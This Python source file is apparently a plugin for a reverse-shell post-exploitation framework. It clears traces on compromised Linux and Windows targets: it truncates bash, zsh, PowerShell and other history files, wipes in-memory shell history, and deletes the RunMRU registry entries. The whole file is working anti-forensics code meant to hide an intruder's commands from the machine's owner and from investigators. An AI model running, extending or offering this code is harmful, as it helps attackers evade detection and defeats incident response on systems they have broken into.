"""Cross-platform shell history clearing for the current user/session."""

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ...win_client import detect_windows_shell_kind
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_historydel_report, resolve_session_platform
from .runner import _run_collector_marked, parse_collector_json


def _linux_collector_source():
    return r'''
import os
cleared = []
failed = []
candidates = [
    os.path.expanduser('~/.bash_history'),
    os.path.expanduser('~/.zsh_history'),
    os.path.expanduser('~/.sh_history'),
    os.path.expanduser('~/.history'),
    os.path.expanduser('~/.python_history'),
    os.path.expanduser('~/.node_repl_history'),
    os.path.expanduser('~/.mysql_history'),
    os.path.expanduser('~/.lesshst'),
    os.path.expanduser('~/.local/share/fish/fish_history'),
    os.path.expanduser('~/.sqlite_history'),
]
for path in candidates:
    if not os.path.isfile(path):
        continue
    try:
        with open(path, 'w'):
            pass
        cleared.append(path)
    except Exception as exc:
        failed.append({'path': path, 'error': str(exc)})
# Best-effort in subprocess (file truncation is the primary effect)
try:
    import subprocess
    subprocess.call('history -c 2>/dev/null; history -w 2>/dev/null; true', shell=True, timeout=3)
except Exception:
    pass
result = {
    'summary': {
        'Cleared': len(cleared),
        'Failed': len(failed),
        'User': os.environ.get('USER', os.environ.get('LOGNAME', '')),
    },
    'cleared': cleared,
    'failed': failed,
    'message': 'Shell history files truncated for current user',
}
_emit(result)
'''


def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$cleared=@(); $failed=@()
$files=@(
  (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
  (Join-Path $env:ProgramData 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
  (Join-Path $env:USERPROFILE '.python_history'),
  (Join-Path $env:USERPROFILE '.node_repl_history'),
  (Join-Path $env:LOCALAPPDATA 'clink\.history'),
  (Join-Path $env:USERPROFILE 'cmd_history.log'),
  (Join-Path $env:USERPROFILE 'cmd.log'),
  (Join-Path $env:USERPROFILE 'commands.log'),
  (Join-Path $env:USERPROFILE '.history')
)
try{{
  Get-ChildItem -Path $env:USERPROFILE -Filter 'cmd_history*.log' -File -EA 0|ForEach-Object{{
    if($files -notcontains $_.FullName){{$files+=$_.FullName}}
  }}
}}catch{{}}
foreach($p in $files){{
  if(Test-Path $p){{
    try{{
      Set-Content -Path $p -Value '' -Force -EA Stop
      $cleared+=$p
    }}catch{{
      $failed+=@{{path=$p;error=$_.Exception.Message}}
    }}
  }}
}}
try{{ Clear-History -ErrorAction SilentlyContinue }}catch{{}}
try{{
  $cmdKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
  if(Test-Path $cmdKey){{
    Remove-ItemProperty -Path $cmdKey -Name * -Exclude '(default)' -EA 0
    $cleared+=$cmdKey
  }}
}}catch{{
  $failed+=@{{path='RunMRU';error=$_.Exception.Message}}
}}
$result=[ordered]@{{
  summary=@{{Cleared=$cleared.Count;Failed=$failed.Count;User=$env:USERNAME}}
  cleared=$cleared
  failed=$failed
  message='Shell and related history storage cleared for current user'
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _resolve_win_shell_kind(session: SessionContext) -> str:
    kind = (session._info or {}).get('win_shell')
    if kind in ('cmd', 'powershell'):
        return kind
    kind = detect_windows_shell_kind(session._handler, session._client_sock)
    session._info['win_shell'] = kind
    return kind


def _session_history_cleanup(session: SessionContext) -> str:
    """Clear in-memory history in the interactive reverse shell when possible."""
    platform = resolve_session_platform(session)
    if platform in ('unix', 'linux'):
        out = session.run_shell(
            'history -c 2>/dev/null; history -w 2>/dev/null; '
            'export HISTSIZE=0 2>/dev/null; true',
            timeout=5.0,
        )
        return 'bash/zsh in-memory history cleared' if out is not None else 'attempted'
    if platform == 'windows':
        shell_kind = _resolve_win_shell_kind(session)
        if shell_kind == 'cmd':
            session.run_shell('doskey /reinstall >nul 2>&1', timeout=5.0)
            return 'cmd.exe in-memory history cleared (doskey buffer reset)'
        session.run_marked('', 'Clear-History -ErrorAction SilentlyContinue', timeout=5.0)
        return 'PowerShell in-memory history cleared (if PS session)'
    return 'skipped'


@plugin.command(
    name='historydel',
    platforms=['linux', 'windows', 'unix'],
    description='Clear current user shell history files and related history storage',
)
def run(session: SessionContext, args):
    session.log_event('Plugin historydel: clear started')
    session.print('Clearing shell history for the current user/session.', 'yellow')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    platform = resolve_session_platform(session)
    win_ps = ''
    unix_cmd = 'true'
    if platform == 'windows':
        win_ps = _build_windows_command()
    elif platform in ('unix', 'linux'):
        unix_cmd = _build_linux_command()
    else:
        win_ps = _build_windows_command()
        unix_cmd = _build_linux_command()
        platform = 'unknown'

    raw = _run_collector_marked(session, unix_cmd, win_ps, platform, 30.0)

    if raw is None:
        session.print("Plugin 'historydel' failed — no response from target.", 'red')
        session.log_plugin_result('historydel', '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'historydel' failed — could not parse results.", 'red')
        session.log_plugin_result('historydel', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'historydel' error on target: {data['error']}", 'red')
        session.log_plugin_result('historydel', raw[:4000], data.get('traceback', ''))
        return 1

    data['session_cleanup'] = _session_history_cleanup(session)

    report = format_historydel_report(data)
    cleared = data.get('cleared') or []
    session.print(report, 'green' if cleared else 'yellow')
    session.log_plugin_result('historydel', report, str(data))
    session.log_command('run historydel', report)
    return 0 if cleared or data.get('session_cleanup') else 1
